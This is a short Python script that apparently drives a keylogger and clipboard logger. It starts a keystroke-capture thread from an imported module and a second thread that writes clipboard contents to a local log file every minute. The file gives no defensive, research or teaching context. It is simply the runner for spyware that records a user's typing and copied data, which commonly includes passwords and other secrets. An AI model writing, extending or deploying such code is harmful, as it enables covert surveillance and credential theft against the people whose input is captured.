import threading
from keystroke import start_keylogger
from clipboard_log import get_encrypted_clipboard
import time
import os

if not os.path.exists("logs"):
    os.mkdir("logs")

def log_clipboard():
    while True:
        data = get_encrypted_clipboard()
        with open("logs/clipboard.log", "a") as f:  
            f.write("\n[CLIPBOARD] " + data + "\n")
        time.sleep(60)

if __name__ == "__main__":
    t1 = threading.Thread(target=start_keylogger)
    t2 = threading.Thread(target=log_clipboard)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
